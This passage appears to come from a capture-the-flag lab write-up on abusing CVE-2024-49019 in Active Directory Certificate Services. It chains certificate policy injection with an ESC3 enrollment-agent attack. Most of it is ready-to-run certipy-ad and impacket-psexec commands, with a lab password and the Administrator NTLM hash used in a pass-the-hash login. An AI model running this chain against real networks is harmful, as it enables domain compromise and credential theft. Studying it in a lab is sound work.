It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. If the CA has not been updated with the relevant security patches (Nov 2024), it will incorrectly include these attacker-supplied Application Policies in the issued certificate. This occurs even if these policies are not defined in, or are inconsistent with, the template’s intended Extended Key Usages (EKUs), thereby granting the certificate unintended capabilities.

---

The key indicators are:

- Enrollee Supplies Subject is True
- Schema Version is 1
- Not patched for CVE-2024-49019

##### PoC

1. Request certificate as the administrator injecting that this certificate has the "Certificate Request Agent" property set.

```
certipy-ad req -u cert_admin -p 'zebra123' -dc-ip 10.129.76.222 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
```

This gave us the administrator.pfx which is an bundle of certificates.

I can basically complete the ESC3 Attack, by leveraging the retrieved pfx to request a ticket as Administrator for a template that is meant for user login:

2. First changed the name of our current .pfx file to avoid issues.

```
mv administrator.pfx cert_admin.pfx
```

3. Request Administrator Certificate with which I can authenticate

```
certipy-ad req -u cert_admin -p 'zebra123' -dc-ip 10.129.76.222 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

4. Auth with the certificate to get the NTLM Hash of Administrator

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.76.222
```

Connected to DC01 using psexec.

```
impacket-psexec Administrator@dc01.tombwatcher.htb -hashes aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```